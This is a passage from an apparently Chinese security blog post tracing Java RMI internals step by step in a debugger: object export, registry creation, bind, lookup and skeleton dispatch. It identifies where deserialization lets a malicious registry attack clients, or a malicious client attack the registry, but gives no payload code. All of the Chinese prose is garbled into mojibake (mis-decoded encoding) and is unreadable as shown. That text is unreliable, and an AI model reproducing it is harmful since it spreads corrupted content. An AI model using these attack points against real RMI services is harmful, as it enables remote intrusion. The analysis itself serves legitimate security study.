srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¸‹é¢ä¸€å †è°ƒç”¨ï¼Œä»ref.exportObjectè·Ÿåˆ°TCPTransport.exportObjectã€‚listen()æ–¹æ³•å¼€å§‹ç›‘å¬ã€‚è·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808182452854.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808182452854.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä»epä¸­æå–äº†Endpointï¼ˆç¿»è¯‘ä¸ºç»ˆç«¯ï¼‰å’Œç«¯å£ã€‚epå°±æ˜¯ä¹‹å‰TCPEndpoint.getLocalEndpointç”Ÿæˆçš„ã€‚ç„¶åè°ƒç”¨äº†newServerSocket</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808182801736.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808182801736.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨newServerSocketä¸­ï¼ŒcreateServerSocketæ–°å»ºäº†ä¸€ä¸ªWebsocketã€‚å¹¶ä¸”ç›‘å¬ç«¯å£ä¸º0ï¼Œä¼šè°ƒç”¨setDefaultPortè·å–ç«¯å£ã€‚ä»å‰é¢çš„è°ƒè¯•ä¿¡æ¯ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œä¸€è·¯è¿‡æ¥ç«¯å£éƒ½æ˜¯é»˜è®¤çš„0</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808183049077.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808183049077.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>setDefaultPortå†…éƒ¨ï¼Œè·å–äº†æ‰€æœ‰çš„æœ¬åœ°æœªå¼€æ”¾ç«¯å£ï¼Œå¹¶å¼‚æ­¥å¾ªç¯å–æœ€åä¸€ä¸ªç«¯å£ã€‚å°±æ˜¯éšæœºå–ä¸€ä¸ªç«¯å£å•¦</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808183329514.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808183329514.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä»è¿™é‡Œå¼€å§‹ï¼Œportå°±æœ‰å€¼äº†ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808183541809.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808183541809.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç»§ç»­è¿è¡Œåˆ°UnicastServerRef.exportObjectã€‚åœ¨getä¸åˆ°å€¼çš„æ—¶å€™ä¼šå‘mapé‡Œputé”®å€¼ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808202655547.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808202655547.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808202749065.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808202749065.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è™½ç„¶æ˜¯putè¿›å»äº†ï¼Œä½†æ˜¯åªæœ‰ä¸ªç±»åã€‚æ–¹æ³•åè¿˜éœ€è¦è·³è½¬åˆ°UnicastServerRef$HashToMethod_Maps.computeValueä¸­è·å–</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808203348116.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808203348116.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä»æ¥å£ä¸­å¾ªç¯è·å–æ–¹æ³•åï¼Œè®¾ä¸ºå¯è®¿é—®ï¼Œputè¿›mapä¸­</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808203552048.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808203552048.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808203719584.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808203719584.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æœ€åæˆ‘ä»¬ç”Ÿæˆçš„remoteImplå¯¹è±¡ï¼Œæœ‰LiveRefåŒ…å«çš„hostå’Œä¸€ä¸ªéšæœºçš„ç«¯å£å·ï¼Œè¿˜æœ‰è£…å¡«äº†æ–¹æ³•çš„hashToMethod_Mapã€‚è¿™äº›éƒ½å°è£…åœ¨UnicastServerRefçš„ä¸€ä¸ªå¯¹è±¡ä¸­ã€‚åˆ›å»ºäº†ä¸€ä¸ªä»£ç†ç±»stubï¼Œä½†æ˜¯returnæ—¶å¹¶æ²¡æœ‰å­˜å‚¨ï¼Œåªæ˜¯å†™äº†ä¸ªé€»è¾‘åœ¨è¿™ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808203908620.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808203908620.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä½†æ˜¯æœåŠ¡ç«¯å¼€éšæœºçš„ç«¯å£å·ï¼Œå®¢æˆ·ç«¯æ€ä¹ˆçŸ¥é“è¿™ä¸ªç«¯å£å·æ¥è·å–ç±»å‘¢ï¼Ÿä¸‹ä¸€æ­¥å°±æ˜¯è§£å†³è¿™ä¸ªé—®é¢˜</p><h4 id="Registry-registry-LocateRegistry-createRegistry-1099"><a href="#Registry-registry-LocateRegistry-createRegistry-1099" class="headerlink" title="Registry registry = LocateRegistry.createRegistry(1099);"></a><code>Registry registry = LocateRegistry.createRegistry(1099);</code></h4><p>æ–°å»ºäº†ä¸€ä¸ªæŒ‡å®šç«¯å£ä¸º1099ç©ºçš„LiveRefå¯¹è±¡</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810201839454.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810201839454.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨éšåçš„setupå‡½æ•°ä¸­ï¼ŒåŒæ ·çš„æ¥åˆ°UnicastServerRef.exportObjectå®Œæˆä»£ç†å¯¹è±¡stubçš„åˆ›å»ºã€‚è¿™æ˜¯æ³¨å†Œç«¯stub</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810205629364.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810205629364.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ³¨æ„ï¼Œè¿™é‡Œåˆ›å»ºstubæ—¶ï¼Œè·Ÿè¿›Util.creatProxy-&gt;stubClassExists()ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911123302805.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911123302805.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¦‚æœå­˜åœ¨remoteClass_Stubç±»ï¼ˆåœ¨è¿™é‡Œå°±æ˜¯RegistryImpl_Stubç±»ï¼‰ï¼Œè¿”å›true</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911103837939.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911103837939.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¯ä»¥çœ‹åˆ°è¯¥ç±»æ˜¯å­˜åœ¨çš„</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911104013368.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911104013368.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨creatStubåˆ›å»ºäº†RegistryImpl_Stubç±»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911104407588.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911104407588.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨è¿™é‡Œï¼Œstubæ˜¯RegistryImpl_Stubï¼Œè€Œä¸æ˜¯æˆ‘ä»¬è‡ªå®šä¹‰çš„RemoteImplã€‚ä¼šèµ°è¿›<code>if (stub instanceof RemoteStub)</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911104535005.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911104535005.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ¥ä¸‹æ¥æ˜¯åˆ›å»ºskeletonã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810205955178.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810205955178.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è·å–äº†ç±»åï¼Œä¸ºRegistryImpl_Skelå¹¶åŠ è½½ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810210236486.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810210236486.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨java.rmi.registryä¸­èƒ½æ‰¾åˆ°è¿™ä¸ªç±»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810210430060.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810210430060.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™ä¸ªç±»å®é™…å°±æ˜¯åˆ†å‘æ–¹æ³•çš„é‡ç‚¹ç±»ã€‚åœ¨RegistryImpl_Skelçš„dispatchç±»ä¸­ï¼Œæ ¹æ®caseçš„ä¸åŒåˆ†åˆ«è°ƒç”¨bindï¼Œlistï¼Œlookupï¼Œrebindå’Œunbindã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810210919526.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810210919526.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810211036199.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810211036199.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æŠŠRegistryçš„publicæ–¹æ³•putè¿›äº†hashToMethod_Mapã€‚åŒ…æ‹¬bindï¼Œlistï¼Œlookupï¼Œrebindå’Œunbindæ–¹æ³•</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810211636007.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810211636007.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æœ€åç”Ÿæˆçš„registryå¯¹è±¡ã€‚åŒ…å«ä¸€ä¸ªå¼€äº†1099ç«¯å£çš„LiveRefï¼Œä¸€ä¸ªå®ä¾‹åŒ–RegistryImpl_Skelçš„skelï¼Œä¸€ä¸ªè£…äº†RegistryImplæ–¹æ³•çš„hashToMethod_Map</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810212211221.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810212211221.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="registry-bind-quot-remoteImpl-quot-remoteImpl"><a href="#registry-bind-quot-remoteImpl-quot-remoteImpl" class="headerlink" title="registry.bind(&quot;remoteImpl&quot;, remoteImpl);"></a><code>registry.bind(&quot;remoteImpl&quot;, remoteImpl);</code></h4><p>è¿™ä¸ªä»£ç å°±å¾ˆå°‘äº†ï¼ŒæŠŠremoteImplå¯¹è±¡putè¿›ä¸€ä¸ªHashTable</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810212513264.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810212513264.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810212459703.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810212459703.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å°è£…åœ¨äº†ä¸Šä¸€æ­¥ç”Ÿæˆçš„registryå¯¹è±¡</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810212754704.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810212754704.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™å°±è§£å†³äº†å®¢æˆ·ç«¯è®¿é—®ä¸äº†éšæœºç«¯å£å·çš„é—®é¢˜ã€‚æˆ‘ä»¬ç°åœ¨å¤§è‡´ä¹Ÿèƒ½çŒœå‡ºå®¢æˆ·ç«¯å‘é€lookupç­‰è¯·æ±‚åï¼Œæ˜¯æ€ä¹ˆå¤„ç†çš„è¯·æ±‚äº†ã€‚</p><p>ç”±1099ç«¯å£å¼€æ”¾çš„æ³¨å†Œä¸­å¿ƒregistryå¯¹è±¡æ¥æ”¶è¯·æ±‚ï¼Œå†ç”±skelçš„dispatchåˆ†å‘ç»™å…·ä½“çš„å‡½æ•°ã€‚æ¯”å¦‚çœ‹è°ƒç”¨çš„RegistryImplçš„lookupå‡½æ•°ï¼Œéƒ½æ˜¯ä»bindingsè·å–è¯·æ±‚çš„ç±»ã€‚è¿™æ‰è·å–åˆ°æˆ‘ä»¬è‡ªå®šä¹‰çš„remoteImpl</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810213419743.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240810213419743.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ¥ä¸‹æ¥éªŒè¯ä¸€ä¸‹çŒœæµ‹</p><h3 id="å®¢æˆ·ç«¯"><a href="#å®¢æˆ·ç«¯" class="headerlink" title="å®¢æˆ·ç«¯"></a>å®¢æˆ·ç«¯</h3><h4 id="LocateRegistry-getRegistry-quot-127-0-0-1-quot-1099"><a href="#LocateRegistry-getRegistry-quot-127-0-0-1-quot-1099" class="headerlink" title="LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);"></a><code>LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);</code></h4><p>ä¸æƒ³è±¡çš„ä¸åŒï¼Œæœ¬ä»¥ä¸ºgetRegistryæ˜¯ä»ç½‘ç»œä¸­åºåˆ—åŒ–çš„æ•°æ®è·å–æ³¨å†Œä¿¡æ¯ã€‚å®é™…ä¸Šæ˜¯åœ¨æœ¬åœ°æ–°å»ºäº†ä¸€ä¸ªRegistryImpl_Stubç±»ç”¨æ¥ä»£ç†è½¬å‘ï¼ŒTCPEndpointæŒ‡å‘127.0.0.1:1099ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911122129504.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911122129504.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911163712452.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911163712452.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="RemoteInterface-registry-lookup-quot-remoteImpl-quot"><a href="#RemoteInterface-registry-lookup-quot-remoteImpl-quot" class="headerlink" title="(RemoteInterface) registry.lookup(&quot;remoteImpl&quot;);"></a><code>(RemoteInterface) registry.lookup(&quot;remoteImpl&quot;);</code></h4><p>è¿™ä¸€æ­¥å› ä¸ºRegistryImpl_Stubæ˜¯1.1ï¼Œè€Œæˆ‘ä»¬è¿™é‡Œæµ‹è¯•ç”¨çš„æ˜¯1.8ï¼Œæ‰€ä»¥è°ƒè¯•è¿›ä¸æ¥ã€‚å°±æ‰‹åŠ¨çœ‹ä¸€ä¸‹ä»£ç </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911164301067.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911164301067.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…ˆè°ƒç”¨newCallï¼Œä¹Ÿå°±æ˜¯è°ƒè¯•è·³è½¬åˆ°çš„UnicastRef.newCallã€‚è¿™ä¸ªå‡½æ•°å’Œè¿œç¨‹TCPEndpointå»ºç«‹äº†è¿æ¥</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911165607312.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240911165607312.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>super.ref.invokeè°ƒç”¨çš„æ˜¯UnicastRef.invokeã€‚æ³¨æ„è¿™ä¸ªexecuteCall()ï¼Œè·Ÿè¿›å»ï¼Œè¿™ä¸ªå‡½æ•°å¾ˆé‡è¦</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912093440111.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912093440111.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>executeCallè¿™ä¸ªå‡½æ•°é‡Œï¼Œå¦‚æœcaseæ˜¯ExceptionalReturnï¼Œé‚£å°±ä¼šè¿›è¡Œååºåˆ—åŒ–ï¼Œè®¾è®¡åˆè¡·æ˜¯ä¸ºäº†ååºåˆ—åŒ–è·å–å¼‚å¸¸å†…å®¹ï¼Œæ–¹ä¾¿è¿›è¡Œè°ƒè¯•ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912094823512.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912094823512.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¼ å…¥æ¶æ„ç±»ï¼Œæå¤§æ¦‚ç‡æŠ¥å¼‚å¸¸èµ°å…¥è¯¥case</p><p>é™¤äº†RegistryImpl_Stub.lookup-&gt;UnicastRef.invoke-&gt;StreamRemoteCall.executeCall-&gt;readObjectå¤–</p><p>RegistryImpl_Stub.bindï¼Œlistï¼Œrebindï¼Œunbindéƒ½èƒ½èµ°åˆ°executeCallè§¦å‘readObject</p><p><strong>æ‰€ä»¥ï¼Œåªè¦ç»‘å®šçš„registryæ˜¯æ¶æ„registryï¼Œlookupæ—¶è¿”å›ä¸€ä¸ªæ¶æ„æµã€‚å®¢æˆ·ç«¯å°±ä¼šå—åˆ°ååºåˆ—åŒ–æ”»å‡»</strong></p><p>lookupä»var2è·å–åºåˆ—åŒ–æµè¿›è¡Œååºåˆ—åŒ–åï¼Œå¾—åˆ°çš„æ˜¯ä¸ªRemoteObjectInvocationHandlerä»£ç†ç±»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912104324211.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912104324211.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æœ‰æ²¡æœ‰è§‰å¾—è¿™ä¸ªä»£ç†ç±»å¾ˆçœ¼ç†Ÿï¼Ÿæ­£æ˜¯å’ŒæœåŠ¡ç«¯<code>new RemoteImpl()</code>Util.creatProxyçš„stubä¸€æ ·ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912104534369.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912104534369.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æˆ‘ä»¬ååºåˆ—åŒ–è·å–äº†æœåŠ¡ç«¯ç”Ÿæˆçš„RemoteImpl()ä»£ç†ç±»å¯¹è±¡ï¼Œåé¢å°±èƒ½æ‰§è¡Œå¯¹åº”æ–¹æ³•äº†</p><h4 id="remoteImpl-sayHello-quot-RMI-quot"><a href="#remoteImpl-sayHello-quot-RMI-quot" class="headerlink" title="remoteImpl.sayHello(&quot;RMI&quot;)"></a><code>remoteImpl.sayHello(&quot;RMI&quot;)</code></h4><p>è·å–åˆ°çš„remoteImplæ˜¯ä¸ªä»£ç†ç±»ï¼Œè°ƒç”¨æ–¹æ³•sayHelloå°±è·³è½¬åˆ°äº†RemoteObjectInvocationHandler.invoke</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912110213795.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912110213795.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è·Ÿè¿›åˆ°UnicastRef.invokeï¼Œè¿™ä¸ªå‡½æ•°å·¨TMé•¿ï¼Œé‡ç‚¹çœ‹ååŠæ®µä»£ç </p><p>marshalValueæ˜¯åºåˆ—åŒ–å‡½æ•°ï¼Œtypesæ˜¯å‚æ•°å€¼ï¼ŒæŠŠå‚æ•°å€¼æ¯ä½åºåˆ—åŒ–åè°ƒç”¨executeCallï¼Œç„¶åunmarshalValueååºåˆ—åŒ–è°ƒç”¨è¿”å›ç»“æœ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912110948705.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912110948705.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>unmarshalValueä¸­çš„readObjectï¼Œä¹Ÿä¼šå¼•èµ·æ¶æ„æ³¨å†Œç«¯å¯¹å®¢æˆ·ç«¯é€ æˆååºåˆ—åŒ–æ”»å‡»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919092009418.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919092009418.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>readObjectçš„ç»“æœå°±æ˜¯<code>remoteImpl.sayHello(&quot;RMI&quot;)</code>çš„è¿”å›å€¼</p><p>æ€»ç»“ä¸€ä¸‹ï¼Œæ”»å‡»å®¢æˆ·ç«¯æœ‰ä¸¤ä¸ªç‚¹</p><ul><li>è·å–è¿œç¨‹å¯¹è±¡ä»£ç†ï¼šRegistryImpl_Stub.lookup-&gt;excuteCall å½“caseä¸ºExceptionalReturnæ—¶è¿”å›æ¶æ„æµé€ æˆååºåˆ—åŒ–æ¼æ´</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912094823512.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240912094823512.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>è°ƒç”¨å‡½æ•°ï¼šunmarshalValueååºåˆ—åŒ– è°ƒç”¨å‡½æ•°ï¼ˆsayHelloï¼‰è¿”å›å€¼</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919092009418.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919092009418.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…¶ä¸­lookupã€bindç­‰-&gt;excuteCallæ”»å‡»å®¢æˆ·ç«¯ï¼Œè¢«ç§°ä¸ºJRMP</p><h3 id="æ³¨å†Œç«¯å¤„ç†å®¢æˆ·ç«¯registry-lookup-quot-remoteImpl-quot"><a href="#æ³¨å†Œç«¯å¤„ç†å®¢æˆ·ç«¯registry-lookup-quot-remoteImpl-quot" class="headerlink" title="æ³¨å†Œç«¯å¤„ç†å®¢æˆ·ç«¯registry.lookup(&quot;remoteImpl&quot;);"></a>æ³¨å†Œç«¯å¤„ç†å®¢æˆ·ç«¯<code>registry.lookup(&quot;remoteImpl&quot;);</code></h3><p>å®¢æˆ·ç«¯è°ƒç”¨lookupæ–¹æ³•ï¼ŒæœåŠ¡ç«¯æ€ä¹ˆèµ°åˆ°<code>RegistryImpl_Skel.dispatch</code>çš„ï¼Œæˆ‘å°±ä¸è·Ÿäº†ï¼Œæ‡’å¾—è·Ÿï¼Œçœ‹äº†ä¹Ÿæ²¡æ„ä¹‰ã€‚ç›´æ¥çœ‹<code>RegistryImpl_Skel.dispatch</code>å¤„ç†lookupè¯·æ±‚ï¼š</p><p>å…¶å®ä¸Šæ–‡éƒ½è´´è¿‡å›¾äº†ï¼Œå°†var2ååºåˆ—åŒ–ï¼Œè°ƒç”¨lookupï¼ŒæŠŠè¿”å›å¯¹è±¡åºåˆ—åŒ–</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919150847207.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919150847207.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919150807876.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919150807876.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™ä¸€æ­¥dispatchçš„var2å‚æ•°å¯¹åº”äº†RegistryImpl_Stub.lookupä¸€å¼€å§‹newCallåˆ›å»ºçš„RemoteCallã€‚ç°åœ¨ç†è§£ä¸ºä»€ä¹ˆå„ä¸ªæ–‡ç« éƒ½è¯´RMIå®é™…æ˜¯å®¢æˆ·ç«¯stubä¸æœåŠ¡ç«¯skelè¿›è¡Œé€šä¿¡äº†å§</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919154350348.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240919154350348.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç”±äºæ³¨å†Œç«¯å¤„ç†æ¥è‡ªå®¢æˆ·ç«¯çš„lookupç­‰è¯·æ±‚ï¼Œéƒ½æ˜¯é€šè¿‡åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼Œå¦‚æœå®¢æˆ·ç«¯RegistryImpl_Stub.lookupä¼ è¾“æ¶æ„RemoteCallï¼Œåˆ™ä¼šå¯¹æ³¨å†Œç«¯é€ æˆååºåˆ—åŒ–æ”»å‡»</p><p>å…¶ä»–å‡ 